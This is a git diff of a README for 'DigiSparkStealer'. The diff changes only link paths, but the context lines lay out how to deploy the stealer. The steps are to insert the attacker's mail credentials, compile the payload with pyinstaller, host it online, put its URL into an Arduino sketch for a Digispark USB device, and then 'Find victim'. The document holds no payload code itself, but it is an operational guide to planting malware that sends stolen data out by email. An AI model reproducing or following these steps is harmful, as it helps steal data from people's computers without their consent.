@@ -73,13 +73,13 @@ Disadvantages:
     
  **Windows:** Click on green button on right top of main page. Then - "Download Zip"
 
-2. Replace your mail, password from the mail and the recipient with your data [here](https://github.com/kovinevmv/DigiSparkStealer/blob/master/source/main.py#L14)
+2. Replace your mail, password from the mail and the recipient with your data [here](https://github.com/kovinevmv/DigiSparkStealer/blob/master/python_source/main.py)
 3. Compile your code by [pyinstaller](http://www.pyinstaller.org/) to create executable file
 ```
 pyinstaller --onefile main.py
 ```
 4. Upload executable file from *dist* to Internet (like git or DropBox)
-5. Replace LINK_HERE with your url [here](https://github.com/kovinevmv/DigiSparkStealer/blob/master/source/sketch.ino)
+5. Replace LINK_HERE with your url [here](https://github.com/kovinevmv/DigiSparkStealer/blob/master/arduino_source/sketch/sketch.ino)
 6. Run sketch in Arduino IDE, plug Digispark Attiny85
 7. Find victim)
 
